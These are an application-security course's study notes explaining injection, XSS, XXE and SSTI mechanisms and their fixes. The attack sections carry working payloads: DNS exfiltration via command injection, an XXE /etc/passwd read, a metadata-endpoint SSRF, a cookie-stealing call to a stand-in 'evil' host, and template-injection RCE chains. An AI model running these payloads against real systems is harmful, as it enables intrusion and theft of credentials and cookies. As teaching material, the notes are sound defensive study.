# SST Application Security — Detailed Notes

> The deep-dive companion to `SST-AppSec-Simplified-Notes.md`.
> Same topics, but here we explain **the mechanism** — what the parser/interpreter
> is actually doing, why each defence works at a structural level, and the full
> spectrum of variations (not just the one payload that solves the lab).
>
> Use the simplified file for last-minute revision; use this one to actually
> understand the material well enough to answer "why" questions in a viva.

---

## Contents

1. [The one idea behind everything](#0)
2. [Session 1 — AppSec foundations](#s1)
3. [Session 2 — Pentest lifecycle & tooling](#s2)
4. [Session 3 — Threat modeling](#s3)
5. [Session 4 — SQL injection](#s4)
6. [Session 5 — OS command injection](#s5)
7. [Session 6 — XSS & clickjacking](#s6)
8. [Session 7 — XXE & SSTI](#s7)
9. [Cross-cutting: how to think about any new bug](#x)

---

<a name="0"></a>
## 0. The one idea behind everything

Almost every vulnerability in this course is an instance of **the confused-deputy / mixing-of-control-and-data problem**:

> A program builds a string out of (trusted) structure + (untrusted) input, and
> then hands that string to an **interpreter**. The interpreter has no idea which
> bytes the developer intended as *commands* and which came from the *attacker*.
> If the attacker can sneak in bytes that the interpreter reads as *structure*,
> they control the program.

The interpreter changes per bug class — and that's the only thing that really changes:

| Bug class | The interpreter | The "structure" bytes the attacker smuggles in |
|---|---|---|
| SQL injection | the database SQL engine | `'`, `--`, `UNION`, `OR` |
| OS command injection | the system shell (`/bin/sh`) | `;`, `|`, `&&`, `$()`, `` ` `` |
| XSS | the browser's HTML/JS parser | `<script>`, `onerror=`, `javascript:` |
| XXE | the XML parser | `<!ENTITY>`, `SYSTEM`, `&xxe;` |
| SSTI | the template engine | `{{ }}`, `${ }`, `<%= %>` |
| Path traversal | the filesystem path resolver | `../`, `%2e%2e%2f` |
| LDAP / NoSQL injection | those query engines | `*`, `)(`, `$ne`, `$where` |

Once you internalise this, two things follow:

1. **Detection is always the same move**: send a byte that *would* be structural in
   that interpreter and see if the program's behaviour changes. A lone `'` for SQL.
   A lone `<` for HTML. `${7*7}` for a template. If the response changes, the
   interpreter saw your byte as structure → you have control.

2. **The real fix is always the same shape**: stop building the string. Send
   *structure* and *data* to the interpreter through **separate channels** so it
   never has to guess. Parameterised queries, argument-array exec, context-aware
   output encoding, disabling entity resolution — these are all "separate the two
   channels" in different costumes. Escaping/blacklisting is *not* the real fix
   because it's still one channel; you're just hoping you guessed every dangerous
   byte, and attackers out-encode you.

Keep this table in your head and every chapter below is just "the same idea, this
interpreter."

---

<a name="s1"></a>
## 1. Session 1 — AppSec foundations

### 1.1 What security actually optimises for

Security is **risk management**, not bug-elimination. You cannot make software
"secure" in an absolute sense; you reduce the *likelihood* and *impact* of a
compromise to a level the business accepts. That's why frameworks talk about
*residual risk* — the risk that remains after controls, which someone explicitly
signs off on.

### 1.2 CIA, expanded

The triad is the set of properties an attack can violate. Every STRIDE category
later maps back to one of these.

- **Confidentiality** — preventing *unauthorised reading*. Broken by: info
  disclosure, IDOR, SQLi data extraction, weak crypto, verbose errors.
  Mechanism of defence: encryption (at rest + in transit), access control,
  least privilege on reads.
- **Integrity** — preventing *unauthorised modification*. Broken by: SQLi writes,
  parameter tampering, MITM, CSRF, insecure deserialization. Defence:
  parameterised writes, digital signatures, TLS, server-side validation.
- **Availability** — keeping the service *usable*. Broken by: DoS/DDoS, ReDoS,
  resource exhaustion, logic bombs. Defence: rate limiting, quotas, autoscaling,
  input-size caps, query timeouts.

Two properties often added: **Authenticity** (you are who you claim — broken by
spoofing) and **Non-repudiation** (you can't deny an action — broken by missing
audit logs). STRIDE's S and R cover these.

### 1.3 OWASP Top 10 — why each one is on the list

The Top 10 is a *prevalence + impact* ranking of risk categories, refreshed every
few years from real breach data. Knowing the rank order matters less than knowing
the mechanism:

- **A01 Broken Access Control** is #1 because it's the most common and most
  directly damaging: the app authenticates you (knows *who* you are) but fails to
  authorise you (check *what you may do*). IDOR, forced browsing to `/admin`,
  changing `userId=123` to `124`.
- **A02 Cryptographic Failures** — data that should be encrypted isn't, or is
  encrypted badly (ECB mode, hard-coded keys, MD5 for passwords, TLS optional).
  Formerly named "Sensitive Data Exposure" — renamed to point at the *cause*.
- **A03 Injection** — the whole §0 idea. Dropped from #1 to #3 only because
  frameworks now ship safe defaults (ORMs parameterise for you).
- **A04 Insecure Design** — added in 2021 to say: some bugs aren't coding
  mistakes, they're *missing a threat model*. You can't patch your way out of a
  design that never considered the abuse case. This is *why threat modeling is a
  Top-10 control*.
- **A05 Security Misconfiguration** — default creds, debug mode on in prod,
  directory listing, over-permissive CORS, unnecessary features enabled.
- **A06 Vulnerable & Outdated Components** — you didn't write the bug; a
  dependency did (Log4Shell). Supply-chain risk.
- **A07 Identification & Authentication Failures** — weak passwords, no MFA,
  session fixation, predictable tokens, credential stuffing.
- **A08 Software & Data Integrity Failures** — trusting unsigned updates,
  insecure deserialization, CI/CD compromise.
- **A09 Logging & Monitoring Failures** — you can't respond to what you can't
  see. Mean-time-to-detect is the metric.
- **A10 SSRF** — promoted via community survey; the app is tricked into being a
  proxy into the internal network. Increasingly critical in cloud (metadata
  endpoints).

### 1.4 DVWA as a learning model

DVWA exists to make the *same vulnerability* observable at four defence strengths.
The pedagogical point is the **security-level slider**:

- **Low** — no defence. See the raw bug.
- **Medium** — a *naive* defence (often a blacklist or a single `str_replace`).
  Teaches you that weak filtering is bypassable.
- **High** — a *better but still flawed* defence. Teaches you that even
  "reasonable looking" mitigations leak.
- **Impossible** — the *correct* fix (parameterised query, proper encoding,
  CSRF token tied to session). This is the reference implementation — read its
  source to learn what right looks like.

The lesson isn't "how to break DVWA"; it's "watch a defence go from absent →
naive → better → correct, and learn to recognise each tier in real code."

---

<a name="s2"></a>
## 2. Session 2 — Pentest lifecycle & tooling

### 2.1 Why there's a *lifecycle* at all

A pentest is a *scientific* process, not random poking. The phases exist so that:
findings are **reproducible** (someone else can re-run your steps), **scoped**
(you never touch out-of-bounds systems), and **reportable** (each finding traces
to evidence). Skipping recon to jump straight to exploitation is how testers miss
80% of the attack surface.

### 2.2 The eight phases — the *intent* of each

1. **Reconnaissance** — build a map *before touching* the target.
   - *Passive* (no packets to target): WHOIS, certificate-transparency logs,
     Google dorks, Shodan, LinkedIn for employee names → username formats.
     Leaves no trace.
   - *Active* (packets hit the target): DNS brute-forcing, port-touching. Louder.
   - Why it matters: every later phase is only as good as the surface you found.
2. **Threat Modeling** — given the map, decide *where to spend effort*. You can't
   test everything equally; model which paths an attacker would realistically
   take (see §3).
3. **Scanning & Enumeration** — turn "there's a host at 10.0.0.5" into "it runs
   OpenSSH 8.2, Apache 2.4.49, MySQL 5.7 with these open ports and these web
   endpoints." *Scanning* finds services; *enumeration* drills into each (users,
   shares, versions).
4. **Vulnerability Analysis** — map enumerated versions to known CVEs and
   misconfigurations. Combine automated scanners (fast, false-positive-prone)
   with manual review (slow, accurate). A scanner says "maybe"; a human confirms.
5. **Exploitation** — *prove* a vuln is real by exploiting it to gain a foothold.
   The goal is *minimum* proof, not maximum damage — you demonstrate impact, you
   don't burn the building down.
6. **Post-Exploitation** — answer "how far could this go?": escalate privilege,
   dump credentials, find what data is reachable. This converts "we have a shell"
   into a *business-impact* statement.
7. **Lateral Movement** — pivot from the first box to others, proving network
   segmentation is (or isn't) effective. Pass-the-Hash, tunnelling, reusing creds.
8. **Reporting** — the *only* deliverable. A brilliant exploit with a bad report
   is a failed engagement. Two audiences: executives (risk, business impact) and
   engineers (exact reproduction steps, code-level fix).

**Rules of Engagement (RoE)** wrap all eight: written authorisation, defined
scope, time windows, emergency contacts, and "stop conditions." Testing without
signed RoE is, legally, just computer crime.

### 2.3 nmap — what the flags *do under the hood*

- `-sS` (SYN/"half-open" scan, default for root): sends SYN, reads SYN-ACK
  (open) or RST (closed), never completes the handshake. Stealthier, faster.
- `-sT` (TCP connect): full handshake; used when you're not root.
- `-sV`: after finding an open port, sends protocol probes and matches the
  banner against a fingerprint DB to name the *service and version* — this is
  what feeds vulnerability analysis.
- `-sU`: UDP — slow and unreliable because UDP is connectionless (no SYN-ACK to
  read); open ports often just stay silent, so nmap infers state from ICMP
  unreachable replies.
- `-p-`: all 65,535 ports, not just the top 1,000 default.
- `-Pn`: skip host-discovery ping. Use when the host firewalls ICMP and would
  otherwise be marked "down" and never scanned.
- `-A`: aggressive — OS detection (`-O`) + version (`-sV`) + default scripts
  (`-sC`) + traceroute, all at once. Loud; great for labs, risky for stealth.
- `--script vuln`: runs the NSE (nmap scripting engine) vulnerability category.
- `-oA base`: output in all three formats (`.nmap` human, `.gnmap` greppable,
  `.xml` machine) so other tools can ingest results.

### 2.4 Burp Suite — the mental model

Burp is an **intercepting proxy**: it sits between your browser and the server so
you can read and rewrite every request *after the browser sent it but before the
server sees it*. That's the whole magic — client-side validation becomes
irrelevant because you edit the request after the JavaScript has run.

- **Proxy** — intercept / forward / drop. Set scope so you only capture the target.
- **Repeater** — take one request, edit it, fire it again and again. The single
  most-used tool: this is where you hand-test injection payloads.
- **Intruder** — *automate* Repeater across a payload list. The four attack types
  are about **how positions and payload-sets combine**:
  - *Sniper*: 1 set, 1 position at a time (N requests for N payloads × 1 pos).
  - *Battering Ram*: 1 set, the same payload dropped into *all* positions at once.
  - *Pitchfork*: multiple sets advanced *in lockstep* (set-A[i] with set-B[i]) —
    use for username/password pairs.
  - *Cluster Bomb*: multiple sets, *every combination* (Cartesian product) — use
    for brute-forcing where you try every user against every password.
- **Decoder / Hackvertor** — encode/decode (URL, base64, HTML entities, hex). The
  key insight: layered encoding bypasses filters that decode only once.
- **Collaborator** — a Burp-controlled external server that logs any DNS/HTTP hit.
  This is how you detect **blind** and **out-of-band** bugs: if the target can be
  made to *call your server*, you've proven code execution even when the response
  body shows nothing.

### 2.5 SAST vs DAST vs IAST (exam distinction)

- **SAST** (Static) reads *source code* without running it — finds patterns
  (string-concat into SQL, `eval`, hard-coded secrets). Early in the SDLC, low
  cost, many false positives, can't see runtime/config issues.
- **DAST** (Dynamic) attacks the *running app* from outside — finds what actually
  exploits (reflected XSS, real SQLi). Later in the SDLC, fewer false positives,
  but can't point to the offending line.
- **IAST** (Interactive) instruments the running app and watches data flow from
  inside — combines both, needs an agent in the runtime.

---

<a name="s3"></a>
## 3. Session 3 — Threat modeling

### 3.1 The core reframe

Threat modeling answers four questions (Microsoft's framing):

1. **What are we building?** → draw a Data Flow Diagram (DFD).
2. **What can go wrong?** → walk STRIDE over every element and flow.
3. **What are we going to do about it?** → mitigations, or accept residual risk.
4. **Did we do a good job?** → review and iterate; it's a *living* document.

The deeper point: threat modeling is **shift-left security**. It happens at
*design* time, before code exists, because the cost of fixing a flaw grows by
roughly 10× per phase (design ≈ $1, code ≈ $10, test ≈ $100, prod ≈ $1,000+).
A missing trust boundary on a whiteboard is free to fix; the same flaw as a
production data breach is not.

### 3.2 DFD elements — and *why* the trust boundary is the star

Five symbols:

- **External entity** (rectangle) — an actor you don't control (browser, 3rd-party
  API). You cannot trust anything it sends.
- **Process** (circle) — code you run (web server, Lambda).
- **Data store** (parallel lines) — data at rest (DB, S3, cache).
- **Data flow** (arrow) — data in motion (HTTP request, SQL query).
- **Trust boundary** (dashed line) — *the line where the trust level changes*.

The trust boundary is where all the action is. **Every data flow that crosses a
trust boundary is an attack-surface entry point.** Inbound across a boundary →
the data is untrusted → *validate it*. Outbound across a boundary → you might be
*leaking* → check what you're exposing. If you find a component handling
attacker-influenced data with no boundary drawn before it, that's a finding by
itself.

### 3.3 STRIDE — the mnemonic decoded

STRIDE is a *checklist of question types* to ask at each element. Each letter is
the **violation of one security property**, which is why it maps cleanly back to
CIA+:

| Letter | Threat | Property violated | Canonical example | Structural fix |
|---|---|---|---|---|
| **S** | Spoofing | Authentication | Reuse a stolen session cookie | MFA, signed tokens, mTLS |
| **T** | Tampering | Integrity | SQLi modifies a record; MITM edits a request | Parameterised queries, TLS, signatures |
| **R** | Repudiation | Non-repudiation | "I never made that transfer" + no logs | Immutable, signed audit logs |
| **I** | Information Disclosure | Confidentiality | Stack trace leaks DB schema | Encryption, generic errors, ACLs |
| **D** | Denial of Service | Availability | Flood the login endpoint | Rate limits, quotas, timeouts |
| **E** | Elevation of Privilege | Authorisation | IDOR; forged admin role in JWT | RBAC, server-side authz on *every* request |

How to *apply* it: for each element and each data flow, ask all six questions.
Aim for ≥2 concrete threats per component. "An attacker exploits the server" is
not a threat; "SQLi in the `/login` username parameter lets an attacker read the
`users` table" is. Specificity is the whole skill.

### 3.4 DREAD — turning threats into priorities

STRIDE *finds* threats; DREAD *ranks* them so you fix the worst first. Score each
1–10 and average:

- **D**amage — how bad if exploited (full RCE = 10; cosmetic = 1).
- **R**eproducibility — how reliably it fires (always = 10; race-condition-once = 2).
- **E**xploitability — skill/effort needed (browser-only = 10; nation-state = 1).
- **A**ffected users — blast radius (all users = 10; just the attacker = 1).
- **D**iscoverability — how easily found (in the docs = 10; deep audit = 1).

`Risk = (D+R+E+A+D)/5`. 9–10 critical, 7–8 high, 4–6 medium, 1–3 low. DREAD is
criticised for subjectivity (two people score differently), so many orgs use
CVSS instead — but DREAD is the one in the syllabus, and the *concept* (numerically
rank to prioritise) is what's being tested.

### 3.5 Other frameworks — one line on *when* to reach for each

- **PASTA** (7-stage, risk-centric) — when *business stakeholders* must be in the
  room and threats need tying to business impact and real attacker simulation.
- **LINDDUN** — STRIDE's privacy twin (Linkability, Identifiability,
  Non-repudiation, Detectability, Disclosure, Unawareness, Non-compliance). Use
  for GDPR/PII systems.
- **Attack Trees** — when you want to enumerate *every path* to one specific
  high-value goal (root = goal, branches = methods).
- **MITRE ATT&CK** — not a modeling method but a *catalogue* of real adversary
  tactics & techniques; use it to ground "what can go wrong" in observed reality.

### 3.6 Worked walk — login flow

Flow: `User → Browser → API → Auth Service → DB`. Two boundaries crossed
(Internet→API, API→DB). Walk STRIDE:

- **S** — attacker replays a stolen session cookie → impersonation. *Fix:* bind
  session to device/IP signals, short TTL, rotate on privilege change.
- **T** — SQLi in `username` bypasses auth. *Fix:* parameterised query.
- **R** — no log of failed logins → can't trace brute-force. *Fix:* log auth
  events to write-once storage.
- **I** — "user not found" vs "wrong password" reveals which accounts exist.
  *Fix:* identical generic message + identical timing.
- **D** — credential stuffing floods login, locking real users out. *Fix:* rate
  limit per-IP and per-account, CAPTCHA after N failures.
- **E** — JWT signed with a weak/`none` secret → forge `role: admin`. *Fix:*
  strong asymmetric signing, reject `alg: none`, validate on every request.

---

<a name="s4"></a>
## 4. Session 4 — SQL injection (deep)

### 4.1 What the database is actually doing

When the app runs `"SELECT * FROM users WHERE name='" + input + "'"`, the DB
receives *one finished string* and parses it into a query *plan*: it tokenises,
decides `'...'` is a string literal, `WHERE` is a clause keyword, etc. The DB has
**no memory** of which characters the developer typed and which came from `input`
— by the time it parses, it's all one string. So if `input` contains a `'`, the
DB closes the string literal *early* and reads whatever follows as **query
structure**. That's the entire bug: a quote flips the attacker from the *data*
context into the *code* context.

### 4.2 The five classes by *what signal the server gives you*

You always pick your technique based on what the server *tells* you:

1. **In-band / UNION** — query results appear in the response. Easiest. Use
   `UNION SELECT` to append rows from other tables into the visible output.
2. **Error-based** — the app leaks DB error text. Force the data you want *into*
   an error message (e.g. cast a string to int so the error prints the string).
3. **Boolean-blind** — no data, no errors, but the page differs between
   true/false. Ask yes/no questions one bit at a time
   (`...AND SUBSTRING(pw,1,1)='a'`) and read the answer from the page state.
4. **Time-blind** — not even a visible true/false difference. Make the DB *sleep*
   conditionally (`IF(condition, SLEEP(5), 0)`) and read the answer from response
   *latency*. Slowest but works when everything else is hidden.
5. **Out-of-band (OOB)** — make the DB *connect to your server* (DNS/HTTP) and
   smuggle the data into the hostname. Used when the response is fully blind and
   even timing is unreliable (Oracle's `UTL_HTTP`, `EXTRACTVALUE` with an
   external entity).

A decision tree falls right out: *data visible?* → UNION. *error visible?* →
error-based. *page changes?* → boolean. *only timing?* → time. *nothing at all?*
→ OOB.

### 4.3 UNION mechanics — the three hard rules and *why*

`UNION` stitches a second result set onto the first. The DB requires:

1. **Same column count** — because it's building one result table; rows must have
   the same width. Find it by `ORDER BY n` (errors when `n` exceeds the column
   count) or by adding `NULL`s until the error stops. `NULL` is used because it's
   type-compatible with everything.
2. **Same column order** — results are matched *by position, not by name*. The
   1st column of your SELECT lands in the 1st column of the output.
3. **Compatible types** — you can only place a string where the original column
   was string-ish. Find the string column by trying `'a'` in each position and
   seeing which renders without a type error.

Database-specific gotchas worth knowing:
- **Oracle** requires a `FROM` on every SELECT → use `FROM dual`.
- **Comment syntax**: MySQL `-- ` (note the *trailing space*) or `#`; Postgres /
  MSSQL / Oracle use `--`; `/* */` is broadly supported.
- **Version string**: `version()` (MySQL/Postgres), `@@version` (MSSQL),
  `banner FROM v$version` (Oracle).
- **Schema enumeration** (non-Oracle): `information_schema.tables` then
  `.columns` — the universal metadata catalogue.

### 4.4 Second-order SQLi (the one people miss)

The injection is *stored* on one request and *executed* on a later one. You
register a username `admin'--`; it's safely *escaped on insert*, so nothing
happens. Later, a different code path reads that username back out of the DB and
concatenates it into a *new* query *without* re-escaping — and now it fires. The
lesson: data is dangerous not only at the entry point but **everywhere it is
later used to build a query**.

### 4.5 Why parameterised queries actually fix it (not "sanitisation")

A prepared statement sends the query *structure* to the DB **first**, with `?`
placeholders. The DB parses and *compiles the plan* — fixing what is code —
**before it has ever seen the user data**. The data is then sent through a
*separate* channel and bound to the placeholders as pure values. Because the plan
is already locked, a `'` in the data can never become a string delimiter; it's
just a character in a value. This is the §0 "two separate channels" fix made
concrete.

Why blacklisting/escaping is inferior: it's still *one* channel; you're guessing
the dangerous-byte set, and attackers defeat it with alternate encodings
(`%27`, double-URL-encoding, Unicode homoglyphs, the XML-entity trick from the
graded lab). Escaping is a speed-bump, not a wall.

Defence-in-depth *around* parameterisation (not instead of it):
- **Least-privilege DB account** — the web app's DB user has only `SELECT/INSERT`
  on the tables it needs; no `DROP`, no `FILE`, no `xp_cmdshell`. Caps the blast
  radius if injection slips through.
- **Suppress raw errors in prod** — kills error-based extraction.
- **WAF** — catches the obvious payloads; trivially bypassed, never primary.

---

<a name="s5"></a>
## 5. Session 5 — OS command injection (deep)

### 5.1 Why it's strictly worse than SQLi

SQLi gives you the *database*; command injection gives you the *operating system*
— you run arbitrary commands as the web-server user. That's a superset: from a
shell you can often *read the DB credentials* and do everything SQLi could, *plus*
read files, install backdoors, and pivot. It's the difference between robbing the
till and getting the keys to the building.

### 5.2 The mechanism

`os.system("ping -c 1 " + host)` hands the **shell** (`/bin/sh`) one string. The
shell is a full language interpreter: it treats certain bytes as *control
operators*. So `host = "8.8.8.8; whoami"` becomes `ping -c 1 8.8.8.8; whoami`,
and the shell reads `;` as "end of command 1, start of command 2." Same §0 idea,
interpreter = shell.

### 5.3 The operator toolkit — and the *semantics* that matter

| Operator | Runs cmd2... | When you use it |
|---|---|---|
| `;` | always, after cmd1 | most reliable; cmd1 can fail |
| `&&` | only if cmd1 *succeeds* | when you need cmd1 to complete first |
| `\|\|` | only if cmd1 *fails* | when cmd1 errors out (e.g. invalid email) |
| `\|` (pipe) | feeds cmd1's stdout to cmd2 | filtering/processing |
| `$(cmd)` / `` `cmd` `` | inline substitution | embed output *inside* another arg |
| `&` | backgrounds cmd1, starts cmd2 | non-blocking OOB callbacks |
| `%0a` (newline) | as a command separator | bypasses filters that only block `;`/`|` |

The `||` trick is the one to understand for the labs: many feedback forms expect
a valid email; you give an invalid one so the *first* command fails, and `||`
fires your payload *because* it failed.

### 5.4 The three blindness tiers (same shape as SQLi)

1. **In-band** — output is in the response. `; cat /etc/passwd`, read it.
2. **Time-blind** — no output, but you can stall the response. `; sleep 10` →
   if the response takes 10s longer, the command ran.
3. **Out-of-band** — no output, no reliable timing. Make the box *phone home*:
   `; nslookup x.BURPCOLLAB`. To *exfiltrate*, embed command output as the DNS
   subdomain: `; nslookup \`whoami\`.BURPCOLLAB` → your Collaborator log shows
   `www-data.<collab>`, leaking the username through DNS itself.

A fourth, *output redirection*, converts blind→in-band: write to a file under the
web root (`; whoami > /var/www/images/out.txt`) then fetch it over HTTP.

### 5.5 Why the list-form API fixes it

`subprocess.run(["ping", "-c", "1", host], shell=False)` never invokes a shell.
The OS `execve()` syscall receives the program path and an **array of arguments**
directly — the kernel does no parsing of `;` or `|`. So `host = "8.8.8.8; whoami"`
is passed to `ping` as *one literal argument*, and `ping` just says "unknown
host." The metacharacters have no power because **there is no shell present to
interpret them**. This is the cleanest illustration of the §0 fix: the structure
(which program, how many args) is fixed by the API, and the data can't escape its
slot.

`shell=True` re-introduces the shell and the bug. Treat any `shell=True` with
user data as a guaranteed finding in code review.

---

<a name="s6"></a>
## 6. Session 6 — XSS & clickjacking (deep)

### 6.1 Why XSS is a *trust* attack, not just a popup

`alert(1)` is only the proof. The real impact: your JavaScript runs **in the
victim's browser, in the victim's session, under the victim's origin**. Same-origin
policy *helps* the attacker here — because your script *is* same-origin, it can
read the DOM, read non-HttpOnly cookies, make authenticated requests as the
victim, and exfiltrate everything. XSS is full client-side account takeover.

### 6.2 The three types — by *where the payload lives and when it executes*

- **Reflected** — payload travels in the *request* (URL/param) and is echoed
  straight back in the *immediate response*. Requires luring the victim to click
  a crafted link. Non-persistent.
- **Stored** — payload is *saved server-side* (comment, profile, log) and served
  to *every* viewer later. No lure needed; the victim just visits a normal page.
  Far more dangerous — one injection, many victims, including admins.
- **DOM-based** — the payload *never touches the server's response*. Client-side
  JS reads attacker-controlled input from a **source** and writes it to a
  dangerous **sink** entirely in the browser. The server logs look clean.

### 6.3 DOM XSS — the source→sink model (the key concept)

Detection of DOM XSS is about tracing data flow in the *JavaScript*, not the
server:

- **Sources** (where attacker data enters the JS): `location.hash`,
  `location.search`, `document.URL`, `document.referrer`, `window.name`,
  `localStorage`, `postMessage` data.
- **Sinks** (where data becomes code if unsanitised): `innerHTML`, `outerHTML`,
  `document.write`, `eval`, `setTimeout(string)`, `element.src`, jQuery `$()`
  with a selector, `location = ...`.

If attacker-controlled data flows from a source into a sink with no sanitisation,
that's DOM XSS. The fix lives in the *client* code, so server-side encoding alone
won't save you.

### 6.4 Context is everything (why one payload doesn't fit all)

The right payload depends on the **HTML context** your input lands in, because the
browser parses each context differently:

- **HTML body** → inject a tag: `<script>` or `<img src=x onerror=...>`.
- **Inside an attribute value** (`value="HERE"`) → first *break out* of the
  attribute: `"><svg onload=...>` — or if angle brackets are blocked, stay inside
  and add an event handler: `" autofocus onfocus=alert(1) x="`.
- **Inside a JS string** (`var x='HERE'`) → break out of the string:
  `'-alert(1)-'` (closes the string, runs, reopens) or `</scr` + `ipt><script>...`.
- **Inside a URL attribute** (`href="HERE"`) → `javascript:alert(1)`.

This is why XSS labs feel like a matrix: same bug, but the *encoding/escaping the
defender applied* determines which context-break you need.

### 6.5 Weaponising — beyond alert(1)

- **Cookie theft**: a script that fetches `//evil/?c=`+`document.cookie` —
  defeated by the `HttpOnly` flag, which makes cookies invisible to JS. (But CSRF
  tokens, API keys in the DOM, and localStorage are still readable.)
- **CSRF-via-XSS**: read the victim's anti-CSRF token from the page with an XHR,
  then submit a state-changing form *with* the valid token. This defeats CSRF
  protection because the request originates same-origin from real JS.
- **Keylogging, BeEF hooking, worm propagation** (stored XSS that re-posts itself).

### 6.6 The fix — context-aware output encoding + CSP

- **Primary**: encode output *for the context it lands in* — HTML-entity-encode
  for body, attribute-encode for attributes, JS-encode for script contexts,
  URL-encode for URLs. Modern frameworks (React, Angular, Vue) auto-encode by
  default — the bug usually reappears when a developer reaches for
  `dangerouslySetInnerHTML` / `v-html` / `[innerHTML]`.
- **Defence-in-depth**: a **Content-Security-Policy** that disallows inline script
  and restricts `script-src` to trusted origins — so even an injected script tag
  won't run. `HttpOnly` on session cookies. Input validation for shape (not as
  the primary control).

### 6.7 Clickjacking — a different beast

Not an injection. The attacker loads the *real* target site in a transparent
`<iframe>` and overlays decoy UI, so the victim *thinks* they're clicking your
"Win a prize" button but are actually clicking the target's "Delete account"
button *in their own authenticated session*. The clicks are real and
same-session, so CSRF tokens don't help — the victim genuinely performs the
action.

**Fix**: tell the browser *who may frame you*. `X-Frame-Options: DENY` (legacy,
binary) or the modern `Content-Security-Policy: frame-ancestors 'none'` (or a
whitelist). Frame-busting JavaScript is the old, bypassable approach (sandboxed
iframes neuter it).

---

<a name="s7"></a>
## 7. Session 7 — XXE & SSTI (deep)

### 7.1 XXE — the XML parser is too helpful

XML's DTD (Document Type Definition) lets a document declare **entities** —
reusable variables. An *external* entity tells the parser to fetch its value from
a URI:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

Then `&xxe;` anywhere in the body is replaced by the *file's contents*. The bug:
a parser configured to **resolve external entities** will happily read local
files, or make network requests, on the attacker's behalf. Pieces:

- `<!DOCTYPE ...>` — the rules block where entities are declared.
- `<!ENTITY name "value">` — an *internal* entity (a literal).
- `<!ENTITY name SYSTEM "uri">` — an *external* entity (fetched from the URI).
- `&name;` — a reference that triggers the substitution.

What you can do with it:
- **File read** — `file:///etc/passwd`. The classic.
- **SSRF** — point `SYSTEM` at an internal URL, e.g. the cloud metadata endpoint
  `http://169.254.169.254/latest/meta-data/...` to steal IAM credentials. XXE is
  often *the* SSRF primitive.
- **Blind / OOB** — when nothing is echoed, point the entity at your Collaborator
  (`http://BURPCOLLAB`) to confirm parsing, then use a *parameter entity* in an
  external DTD to exfiltrate file contents into the request URL (the error-based
  and OOB-DTD techniques).
- **Via file upload** — an `.svg`, `.docx`, or `.xlsx` is XML under the hood;
  upload one with an XXE payload to reach a parser that never expected user XML.

**Fix — disable external entities** (the structural cure): this is the one place
the fix isn't "two channels" but "turn off the dangerous feature you don't need."
Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`.
PHP (pre-8): `libxml_disable_entity_loader(true)`. Python: use `defusedxml`
instead of the stdlib parser. The general principle: **disable DTD processing /
external entity resolution unless you have a hard requirement for it** (you
almost never do).

### 7.2 SSTI — when user input becomes template code

Template engines (Jinja2, Twig, Freemarker, ERB, Velocity, Handlebars) exist to
mix *static markup* with *dynamic values*: `Hello {{ name }}`. The bug: the
developer puts **user input into the template string itself** rather than passing
it as a *value* to a fixed template. Now the engine evaluates the attacker's
input *as template syntax* — and template syntax usually has access to language
internals, which means RCE.

**Detection** — the §0 "send a structural byte" move, specialised per engine:
send a math expression and see if it's evaluated.

- `${7*7}` → `49` ⇒ Freemarker / Velocity (Java)
- `{{7*7}}` → `49` ⇒ Jinja2 (Python) / Twig (PHP)
- `<%= 7*7 %>` → `49` ⇒ ERB (Ruby)
- `#{7*7}` ⇒ Ruby/Pug expression contexts
- `*{7*7}` ⇒ Thymeleaf

A branching probe like `${{<%[%'"}}%\` is used to provoke an error that *names*
the engine.

**The class methodology (3 steps):**
1. Find **reflection** — confirm your input is echoed back somewhere.
2. **Fingerprint** the engine — which math syntax evaluates / which error appears.
3. Map to that engine's **RCE primitive** — every engine has a documented chain
   from "template eval" to "OS command":
   - Jinja2: walk the Python object graph —
     `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.
   - Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`.
   - Freemarker: `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`.
   - ERB: `<%= system("id") %>`.

Why it reaches RCE: these engines expose object/reflection internals to templates
by design (for legitimate power), so once the attacker controls the template they
inherit that power.

**Fix:**
- **Never** concatenate user input into the template *source*. Pass it as a
  *bound variable* to a fixed, pre-compiled template — the §0 two-channel fix
  again (template = structure, variables = data).
- If users must supply templates, use a **logic-less / sandboxed** engine
  (e.g. a restricted Mustache/Handlebars config) that exposes no object access.
- Run the renderer in a locked-down sandbox as defence-in-depth.

### 7.3 XXE vs SSTI — the shared lesson

Both are "the helpful feature is the vulnerability": XML's entity resolution and
templates' object access are *intended capabilities* that become RCE/file-read
when fed attacker-controlled structure. The fix in both cases is to **deny the
capability you didn't actually need** (external entities off; sandboxed
templates) *and* to keep user input out of the structural channel.

---

<a name="x"></a>
## 9. Cross-cutting — how to attack (or defend) any new bug

A repeatable method that generalises beyond the syllabus:

**As an attacker / tester:**
1. **Map the interpreters.** For every input, ask: where does this byte
   eventually get *parsed* — SQL? shell? HTML? a template? a path? an XML/JSON
   parser? That tells you which structural bytes to try.
2. **Probe with one structural byte.** `'` (SQL), `<` (HTML), `;` (shell),
   `${7*7}` (template), `../` (path), `&xxe;` (XML). Watch for *any* behaviour
   change: error, content diff, timing, OOB callback.
3. **Classify the feedback channel.** Visible data → in-band. Error text →
   error-based. Page state diff → boolean-blind. Latency → time-blind. Nothing →
   out-of-band (Collaborator).
4. **Escalate from proof to impact.** `alert(1)` → cookie theft. `whoami` →
   read secrets → pivot. One row → dump the table. Always tie it to a
   *business-impact* sentence for the report.
5. **Treat every input vector as in-scope:** URL params, POST bodies, JSON/XML
   fields, headers (`Host`, `Referer`, `User-Agent`, `X-Forwarded-*`), cookies,
   and the URL path itself. Bugs hide in the inputs developers forgot are inputs.

**As a defender:**
1. **Separate code from data** at every interpreter boundary (parameterise,
   argument-arrays, output-encode, bind template variables).
2. **Disable capabilities you don't need** (external entities, `shell=True`,
   dangerous template object access, unused HTTP methods).
3. **Validate input** for *shape* at the boundary (defence-in-depth, never the
   primary control).
4. **Least privilege** everywhere (DB account, web-process user, IAM role,
   token scope) so a single bug has a small blast radius.
5. **Make failures visible** (logging/monitoring) and **fail closed** (deny by
   default on access control).

The exam-and-real-world takeaway: you are never memorising 30 unrelated tricks.
You are recognising the *same confusion-of-code-and-data problem* through 30
different interpreters, and applying the *same separate-the-channels fix* in 30
different costumes.

---

*Companion to `SST-AppSec-Simplified-Notes.md` and `PortSwigger-WebSecurity-Notes.md`.
Generated 2026-05-28.*
